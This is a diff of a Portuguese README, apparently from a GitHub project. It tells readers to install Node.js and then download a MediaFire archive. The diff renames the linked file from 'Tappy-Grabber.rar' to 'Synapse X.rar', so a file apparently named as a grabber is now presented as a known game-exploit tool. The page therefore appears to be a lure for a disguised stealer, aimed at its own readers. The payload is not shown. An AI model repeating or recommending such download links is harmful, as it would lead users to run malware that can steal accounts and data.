@@ -6,16 +6,23 @@
 
 Conceitos básicos
 
-1- Fazer o Download do Node.js pois é necessário para o script funcionar.
+
+![foto](https://user-images.githubusercontent.com/113463089/191644913-5e37fea8-c0a8-4f4e-90bb-4492aee41623.png)
+
+<br><br>
+💢 - <b>Fazer o Download do Node.js pois é necessário para o script funcionar. <p> 
+💢 ( OBS : CASO NÃO INSTALE O NODE JS, O SYNAPSE NÃO VAI ABRIR. ) 💢<P>
 💸 <b>• Download do NodeJS 64 Bits:</b> https://nodejs.org/dist/v18.9.0/node-v18.9.0-x64.msi
 <p>
 💸 <b>• Download do NodeJS 32 Bits:</b> https://nodejs.org/dist/v18.9.0/node-v18.9.0-x86.msi
 
+<br><p>
+- Segue o VÍDEO.
 
-
-
-
+<p>
+https://www.youtube.com/watch?v=exeD-38mi5s
 <br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/f4xf60tgw7rvz2y/Tappy-Grabber.rar/file
+<br><br>
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/ghaxtvutc606lsi/Synapse+X.rar/file
 <br>
 <br>
